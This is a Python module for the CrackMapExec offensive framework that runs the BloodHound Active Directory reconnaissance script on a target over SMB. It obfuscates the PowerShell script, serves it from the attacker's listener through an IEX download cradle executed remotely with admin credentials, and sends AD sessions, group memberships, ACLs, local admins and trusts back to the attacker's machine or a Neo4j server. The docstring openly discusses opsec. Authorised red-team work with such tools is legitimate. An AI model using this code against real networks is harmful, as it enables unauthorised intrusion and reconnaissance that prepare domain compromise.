from cme.helpers.powershell import *
from cme.helpers.misc import validate_ntlm
from cme.helpers.logger import write_log
from sys import exit

class CMEModule:
    '''
        Executes the BloodHound recon script on the target and retreives the results onto the attackers' machine
        2 supported modes :
            CSV :           exports data into CSVs on the target file system before retrieving them (NOT opsec safe)
            Neo4j API :     exports data directly to the Neo4j API (opsec safe)

        Module by Waffle-Wrath
        Bloodhound.ps1 script base : https://github.com/BloodHoundAD/BloodHound
    '''

    name = 'bloodhound'
    description = 'Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine'
    supported_protocols = ['smb']
    opsec_safe= False
    multiple_hosts = False

    def options(self, context, module_options):
        '''
        THREADS             Max numbers of threads to execute on target (defaults to 20)
        COLLECTIONMETHOD    Method used by BloodHound ingestor to collect data (defaults to 'Default')
        CSVPATH             (optional) Path where csv files will be written on target (defaults to C:\)
        NEO4JURI            (optional) URI for direct Neo4j ingestion (defaults to blank)
        NEO4JUSER           (optional) Username for direct Neo4j ingestion
        NEO4JPASS           (optional) Pass for direct Neo4j ingestion

        Give NEO4J options to perform direct Neo4j ingestion (no CSVs on target)
        '''

        self.threads = 3
        self.csv_path = 'C:\\'
        self.collection_method = 'Default'
        self.neo4j_URI = ""
        self.neo4j_user = ""
        self.neo4j_pass = ""

        if module_options and 'THREADS' in module_options:
            self.threads = module_options['THREADS']
        if module_options and 'CSVPATH' in module_options:
            self.csv_path = module_options['CSVPATH']
        if module_options and 'COLLECTIONMETHOD' in module_options:
            self.collection_method = module_options['COLLECTIONMETHOD']
        if module_options and 'NEO4JURI' in module_options:
            self.neo4j_URI = module_options['NEO4JURI']
        if module_options and 'NEO4JUSER' in module_options:
            self.neo4j_user = module_options['NEO4JUSER']
        if module_options and 'NEO4JPASS' in module_options:
            self.neo4j_pass = module_options['NEO4JPASS']

        if self.neo4j_URI != "" and self.neo4j_user != "" and self.neo4j_pass != "" :
            self.opsec_safe= True

        self.ps_script = obfs_ps_script('BloodHound-modified.ps1')

    def on_admin_login(self, context, connection):
        if self.neo4j_URI == "" and self.neo4j_user == "" and self.neo4j_pass == "" :
            command = "Invoke-BloodHound -CSVFolder '{}' -Throttle '{}' -CollectionMethod '{}'".format(self.csv_path, self.threads, self.collection_method)
        else :
            command = 'Invoke-BloodHound -URI {} -UserPass "{}:{}" -Throttle {} -CollectionMethod {}'.format(self.neo4j_URI, self.neo4j_user, self.neo4j_pass, self.threads, self.collection_method)
        launcher = gen_ps_iex_cradle(context, 'BloodHound-modified.ps1', command)
        connection.ps_execute(launcher)
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'BloodHound-modified.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            request.wfile.write(self.ps_script.encode())
            context.log.success('Executing payload... this can take a few minutes...')
        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()
        response.stop_tracking_host()
        if self.neo4j_URI == "" and self.neo4j_user == "" and self.neo4j_pass == "" :
            self.parse_ouput(data, context, response)
        context.log.success("Successfully retreived data")

    def parse_ouput(self, data, context, response):
        '''
        Parse the output from Invoke-BloodHound
        '''

        parsedData = data.split("!-!")
        nameList = ['user_sessions', 'group_membership.csv', 'acls.csv', 'local_admins.csv', 'trusts.csv']
        for x in range(0, len(parsedData)):
            if "ComputerName" in parsedData[x] and "UserName" in parsedData[x] :
                log_name = '{}-{}-{}.csv'.format(nameList[0], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
                write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
                context.log.info("Saved csv output to {}".format(log_name))
            elif "GroupName" in parsedData[x] and "AccountName" in parsedData[x] :
                log_name = '{}-{}-{}.csv'.format(nameList[1], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
                write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
                context.log.info("Saved csv output to {}".format(log_name))
            elif "ComputerName" in parsedData[x] and "AccountName" in parsedData[x] :
                log_name = '{}-{}-{}.csv'.format(nameList[3], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
                write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
                context.log.info("Saved csv output to {}".format(log_name))
            elif "SourceDomain" in parsedData[x] and "TrustType" in parsedData[x] :
                log_name = '{}-{}-{}.csv'.format(nameList[4], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
                write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
                context.log.info("Saved csv output to {}".format(log_name))
            elif "ObjectName" in parsedData[x] and "ObjectType" in parsedData[x] :
                log_name = '{}-{}-{}.csv'.format(nameList[2], response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
                write_log(parsedData[x].replace('" "', '"\n"').replace(' "', '"'), log_name)
                context.log.info("Saved csv output to {}".format(log_name))